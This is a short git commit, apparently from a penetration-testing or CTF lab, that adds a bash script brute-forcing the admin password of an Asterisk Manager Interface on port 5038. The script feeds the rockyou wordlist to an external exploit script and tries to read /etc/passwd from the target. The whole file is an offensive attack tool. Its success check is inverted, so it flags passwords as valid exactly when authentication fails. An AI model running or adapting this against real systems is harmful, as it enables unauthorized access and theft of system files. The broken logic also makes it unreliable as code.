cd16a57452bcad1cc856294982c181490698331c
NHAsec <h.nabi0@gmail.com>
2025-09-03 00:02:58 -0700

    Added asterisk brute forcer

---
+++ asterisk_call_manager_brute.sh
@@ -0,0 +1,10 @@
+while read -r pass;do
+        output=$(python3 51927.py -p 5038 -u admin -P "$pass" -f /etc/passwd 10.201.85.4)
+        if ! echo $output | grep -qiE "invalid|authentication failed"; then
+                continue
+        else
+                echo "Valid pass: $pass"
+                echo "$output"
+                exit 0
+        fi
+done < /usr/share/wordlists/rockyou.txt
